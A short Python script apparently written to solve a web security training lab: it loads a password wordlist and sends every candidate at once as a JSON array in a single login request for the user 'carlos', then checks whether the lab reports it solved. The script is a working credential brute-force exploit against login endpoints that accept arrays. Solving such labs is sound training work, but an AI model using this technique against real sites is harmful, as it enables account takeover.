import requests
import re
import os

def brute(session, domain, username, wordlist):
    passwords = [password.strip() for password in open(wordlist, 'r').readlines()]
    json = {'username': username, 'password': passwords}
    r = session.post(domain + '/login', json=json)
    
def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')


if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    with requests.Session() as session:
        try:
            path = os.path.dirname(os.path.abspath(__file__))
            brute(session, domain, 'carlos', os.path.join(path, 'passwordlist.txt'))
            verify(session, domain)
        except requests.exceptions.ConnectionError:
            print('Connection Error. Please check your network connection.')
    # except:
        # print('Something went wrong. Please try again.')